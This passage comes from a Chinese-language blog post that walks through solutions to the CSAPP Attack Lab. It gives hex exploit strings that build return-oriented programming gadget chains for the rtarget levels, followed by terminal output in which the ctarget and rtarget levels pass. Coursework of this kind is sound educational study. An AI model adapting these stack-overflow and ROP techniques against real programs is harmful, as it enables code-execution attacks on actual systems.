<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">cf 18 40 00 00 00 00 00 &#x2F;* popq %rax *&#x2F;</span><br><span class="line">08 4a 2e 2a 00 00 00 00 &#x2F;* 将 cookie 存入 %rax *&#x2F;</span><br><span class="line">e1 18 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi *&#x2F;</span><br><span class="line">55 17 40 00 00 00 00 00 &#x2F;* 返回到 touch2 *&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>与之前的 <code>level 3</code> 相同，需要将 <code>%rdi</code> 指向 <code>cookie</code> 的字符串表示的首地址。我们需要把 <code>cookie</code> 字符串放在高地址，根据 <code>%rsp</code> 和偏移量去取地址。<br>在 <code>farm.s</code> 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000042 &lt;add_xy&gt;:</span><br><span class="line">  42:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  46:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p><code>lea (%rdi,%rsi,1) %rax</code> 就是 <code>%rax = %rdi + %rsi</code>，所以，只要能够让 <code>%rdi</code> 和 <code>%rsi</code> 其中一个保存 <code>%rsp</code>，另一个保存偏移量，就可以计算出 <code>cookie</code> 存放的地址，然后 <code>movq %rax,%rdi</code> 再调用 <code>touch3</code> 就可以了。<br>所以，分两步走：先保存一个栈顶地址，这里我通过 <code>%rsp -&gt; %rax -&gt; %rdi</code> 保存到 <code>%rdi</code> 中，再将偏移量通过 <code>%eax(%rax) -&gt; %ecx -&gt; %edx -&gt; %esi</code> 保存到 <code>%esi(%rsi)</code> 中。注意，偏移量的值需要等所有指令写完后才能确定。<br><code>level 3(rtarget)</code> 最终结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">1e 19 40 00 00 00 00 00 &#x2F;* movq %rsp,%rax (48 89 e0) *&#x2F;</span><br><span class="line">e1 18 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi (48 89 c7) *&#x2F;</span><br><span class="line">cf 18 40 00 00 00 00 00 &#x2F;* popq %rax (58) *&#x2F;</span><br><span class="line">&#x2F;* %rdi中保存的是 movq %rsp,%rax 这条指令的栈顶地址，所以最终偏移量为 0x48 *&#x2F;</span><br><span class="line">48 00 00 00 00 00 00 00 &#x2F;* 偏移量 *&#x2F;</span><br><span class="line">58 19 40 00 00 00 00 00 &#x2F;* movl %eax,%ecx (89 c1) *&#x2F;</span><br><span class="line">7a 19 40 00 00 00 00 00 &#x2F;* movl %ecx,%edx (89 ca) *&#x2F;</span><br><span class="line">0c 19 40 00 00 00 00 00 &#x2F;* movl %edx,%esi (89 d6) *&#x2F;</span><br><span class="line">f3 18 40 00 00 00 00 00 &#x2F;* add_xy *&#x2F;</span><br><span class="line">e1 18 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi (48 89 c7) *&#x2F;</span><br><span class="line">29 18 40 00 00 00 00 00 &#x2F;* touch3地址 *&#x2F;</span><br><span class="line">32 61 32 65 34 61 30 38 &#x2F;* 目标字符串 *&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-ctarget.l1 | .&#x2F;ctarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-ctarget.l2 | .&#x2F;ctarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch2!: You called touch2(0x2a2e4a08)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-ctarget.l3 | .&#x2F;ctarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;2a2e4a08&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-rtarget.l1 | .&#x2F;rtarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch2!: You called touch2(0x2a2e4a08)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-rtarget.l2 | .&#x2F;rtarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;2a2e4a08&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
<h2 id="repo"><a href="#repo" class="headerlink" title="repo"></a>repo</h2><p><a target="_blank" rel="noopener" href="https://github.com/hey-kong/csapp">My solutions to CSAPP labs</a></p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/page/12/">Zurück</a></div><div class="pagination-next"><a href="/page/14/">Weiter</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/12/">12</a></li><li><a class="pagination-link is-current" href="/page/13/">13</a></li><li><a class="pagination-link" href="/page/14/">14</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/logo.jpg" alt="Iggie Wang (王亮)"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Iggie Wang (王亮)</p><p class="is-size-6 is-block">WNLO, HUST</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Wuhan, China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Seiten</p><a href="/archives"><p class="title">42</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Kategorien</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">15</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/hey-kong" target="_blank" rel="noopener">Folgen</a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://github.com/hey-kong" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Github</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li><li><a class="level is-mobile" href="iggiewang@gmail.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Email</span></span><span class="level-right"><span class="level-item tag">iggiewang@gmail.com</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archive</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">August 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/07/"><span class="level-start"><span class="level-item">July 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/12/"><span class="level-start"><span class="level-item">December 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">October 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">September 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">July 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">May 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">April 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">March 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">January 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CSAPP/"><span class="tag">CSAPP</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cache/"><span class="tag">Cache</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Chinese/"><span class="tag">Chinese</span><span class="tag">37</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Database/"><span class="tag">Database</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Edge-computing/"><span class="tag">Edge computing</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/English/"><span class="tag">English</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/File-System/"><span class="tag">File System</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Key-Value-Store/"><span class="tag">Key-Value Store</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/KubeEdge/"><span class="tag">KubeEdge</span><span class="tag">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Learned-Index/"><span class="tag">Learned Index</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RDMA/"><span class="tag">RDMA</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Rocksdb/"><span class="tag">Rocksdb</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/docker/"><span class="tag">docker</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/etcd/"><span class="tag">etcd</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/k8s/"><span class="tag">k8s</span><span class="tag">4</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">Iggie Wang&#039;s Cyberspace</a><p class="is-size-7"><span>&copy; 2023 王亮</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script>moment.locale("default");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Zurück nach oben" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "Diese Website verwendet Cookies, um Ihre Erfahrung zu verbessern.",
          dismiss: "Verstanden!",
          allow: "Cookies zulassen",
          deny: "Ablehnen",
          link: "Mehr erfahren",
          policy: "Cookie-Richtlinie",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Tippen Sie etwas..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Tippen Sie etwas...","untitled":"(Ohne Titel)","posts":"Seiten","pages":"Pages","categories":"Kategorien","tags":"Tags"});
        });</script></body></html>